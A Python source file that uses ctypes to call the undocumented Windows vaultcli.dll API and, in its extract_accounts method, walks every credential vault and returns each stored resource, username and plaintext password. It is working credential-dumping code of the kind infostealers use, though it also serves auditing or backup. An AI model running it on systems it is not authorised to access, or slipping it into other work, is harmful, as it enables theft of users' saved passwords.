import ctypes
from enum import IntEnum, auto

VAULT_ENUMERATE_ALL_ITEMS = 512

class VAULT_SCHEMA_ELEMENT_ID(IntEnum):
	ElementId_Illegal = 0
	ElementId_Resource = auto()
	ElementId_Identity = auto()
	ElementId_Authenticator = auto()
	ElementId_Tag = auto()
	ElementId_PackageSid = auto()
	ElementId_AppStart = 0x64
	ElementId_AppEnd = 0x2710

class VAULT_ELEMENT_TYPE(IntEnum):
	ElementType_Boolean = 0
	ElementType_Short = auto()
	ElementType_UnsignedShort = auto()
	ElementType_Integer = auto()
	ElementType_UnsignedInteger = auto()
	ElementType_Double = auto()
	ElementType_Guid = auto()
	ElementType_String = auto()
	ElementType_ByteArray = auto()
	ElementType_TimeStamp = auto()
	ElementType_ProtectedArray = auto()
	ElementType_Attribute = auto()
	ElementType_Sid = auto()
	ElementType_Last = auto()
	ElementType_Undefined = 0xFFFFFFFF

class GUID(ctypes.Structure):
	_pack_ = 4
	_fields_ = [("c", ctypes.c_ubyte * 16)]

class VAULT_BYTE_BUFFER(ctypes.Structure):
	_fields_ = [
		("Length", ctypes.c_ulong),
		("Value", ctypes.POINTER(ctypes.c_uint8))
	]

class VAULT_ITEM_DATA_UNION(ctypes.Union):
	_fields_ = [
		("Boolean", ctypes.c_int),
		("SHORT", ctypes.c_short),
		("UnsignedShort", ctypes.c_ushort),
		("Int", ctypes.c_long),
		("UnsignedInt", ctypes.c_ulong),
		("Double", ctypes.c_double),
		("Guid", GUID),
		("String", ctypes.POINTER(ctypes.c_wchar)),
		("ByteArray", VAULT_BYTE_BUFFER),
		("ProtectedArray", VAULT_BYTE_BUFFER),
		("Attribute", ctypes.c_ulong),
		("Sid", ctypes.c_ulong)
	]

class VAULT_ITEM_DATA(ctypes.Structure):
	_fields_ = [
		("SchemaElementId", ctypes.c_ulong),
		("unk0", ctypes.c_ulong),
		("Type", ctypes.c_ulong),
		("unk1", ctypes.c_ulong),
		("data", VAULT_ITEM_DATA_UNION)
	]

class VAULT_ITEM(ctypes.Structure):
	_pack_ = ctypes.sizeof(ctypes.c_void_p) # microsoft abi a little bit different
	_fields_ = [
		("SchemaId", GUID),
		("FriendlyName", ctypes.POINTER(ctypes.c_wchar)),
		("Resource", ctypes.POINTER(VAULT_ITEM_DATA)),
		("Identity", ctypes.POINTER(VAULT_ITEM_DATA)),
		("Authenticator", ctypes.POINTER(VAULT_ITEM_DATA)),
		("PackageSid", ctypes.POINTER(VAULT_ITEM_DATA)),
		("LastWritten", ctypes.c_ulonglong),
		("Flags", ctypes.c_ulong),
		("cbProperties", ctypes.c_ulong),
		("Properties", ctypes.POINTER(VAULT_ITEM_DATA))
	]

TypeVaultEnumerateVaults = ctypes.WINFUNCTYPE(ctypes.c_ulong, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong), ctypes.POINTER(ctypes.POINTER(GUID)))
TypeVaultEnumerateItems = ctypes.WINFUNCTYPE(ctypes.c_ulong, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong), ctypes.POINTER(ctypes.POINTER(VAULT_ITEM)))
TypeVaultOpenVault = ctypes.WINFUNCTYPE(ctypes.c_ulong, ctypes.POINTER(GUID), ctypes.c_ulong, ctypes.POINTER(ctypes.c_void_p))
TypeVaultCloseVault = ctypes.WINFUNCTYPE(ctypes.c_ulong, ctypes.POINTER(ctypes.c_void_p))
TypeVaultFree = ctypes.WINFUNCTYPE(ctypes.c_ulong, ctypes.c_void_p)
TypeVaultGetItem = ctypes.WINFUNCTYPE(ctypes.c_ulong, ctypes.c_void_p, ctypes.POINTER(GUID), ctypes.POINTER(VAULT_ITEM_DATA), ctypes.POINTER(VAULT_ITEM_DATA), ctypes.POINTER(VAULT_ITEM_DATA), ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.POINTER(VAULT_ITEM)))

class WinVault:
	def __init__(self):
		self.kernel32 = ctypes.windll.kernel32
		self.vaultdll = ctypes.WinDLL("vaultcli.dll")
		
		# preinit those
		self.kernel32.GetModuleHandleW.argtypes = [ctypes.c_wchar_p]
		self.kernel32.GetModuleHandleW.restype = ctypes.c_void_p
		self.kernel32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
		self.kernel32.GetProcAddress.restype = ctypes.c_void_p
		self.vaultdllhandle = self.kernel32.GetModuleHandleW("vaultcli.dll")

		# resolve these here so we can use them futher
		self.VaultEnumerateVaults = TypeVaultEnumerateVaults(self.__resolve_vault_func(b"VaultEnumerateVaults"))
		self.VaultEnumerateItems = TypeVaultEnumerateItems(self.__resolve_vault_func(b"VaultEnumerateItems"))
		self.VaultOpenVault = TypeVaultOpenVault(self.__resolve_vault_func(b"VaultOpenVault"))
		self.VaultCloseVault = TypeVaultCloseVault(self.__resolve_vault_func(b"VaultCloseVault"))
		self.VaultFree = TypeVaultFree(self.__resolve_vault_func(b"VaultFree"))
		self.VaultGetItem = TypeVaultGetItem(self.__resolve_vault_func(b"VaultGetItem"))

	def __resolve_vault_func(self, func: bytes) -> int:
		address = self.kernel32.GetProcAddress(self.vaultdllhandle, func)
		return ctypes.cast(address, ctypes.c_void_p).value

	def extract_accounts(self) -> list[tuple[str, str, str]]:
		result = []
		vaults_num = ctypes.c_ulong(0)
		vaults_guids = ctypes.POINTER(GUID)()
		if self.VaultEnumerateVaults(ctypes.c_ulong(0), ctypes.byref(vaults_num), ctypes.byref(vaults_guids)) >= 0:
			for vault_num in range(vaults_num.value):
				vault = ctypes.c_void_p(0)
				if self.VaultOpenVault(ctypes.byref(vaults_guids[vault_num]), ctypes.c_ulong(0), ctypes.byref(vault)) >= 0:
					vault_items_num = ctypes.c_ulong(0)
					vault_items = ctypes.POINTER(VAULT_ITEM)()
					if self.VaultEnumerateItems(vault, ctypes.c_ulong(VAULT_ENUMERATE_ALL_ITEMS), ctypes.byref(vault_items_num), ctypes.byref(vault_items)) >= 0:
						for item_num in range(vault_items_num.value):
							item = vault_items[item_num]
							item_resource = item.Resource
							item_identity = item.Identity

							if item_resource:
								item_resource = ctypes.cast(item_resource.contents.data.String, ctypes.c_wchar_p).value if item_resource.contents.data.String else ""
							else:
								item_resource = ""
							
							if item_identity:
								item_identity = ctypes.cast(item_identity.contents.data.String, ctypes.c_wchar_p).value if item_identity.contents.data.String else ""
							else:
								item_identity = ""

							# the password needs to be extracted differently
							password_item = ctypes.POINTER(VAULT_ITEM)()
							password = ""
							if self.VaultGetItem(vault, ctypes.byref(item.SchemaId), item.Resource, item.Identity, item.PackageSid, ctypes.c_void_p(0), ctypes.c_ulong(0), ctypes.byref(password_item)) >= 0:
								if password_item and password_item.contents.Authenticator:
									pwdstr = password_item.contents.Authenticator.contents.data.String
									if pwdstr: password = ctypes.cast(pwdstr, ctypes.c_wchar_p).value
								self.VaultFree(password_item)
							result.append((item_resource, item_identity, password))
						self.VaultFree(vault_items)
					self.VaultCloseVault(ctypes.byref(vault))
			self.VaultFree(vaults_guids)
		return result

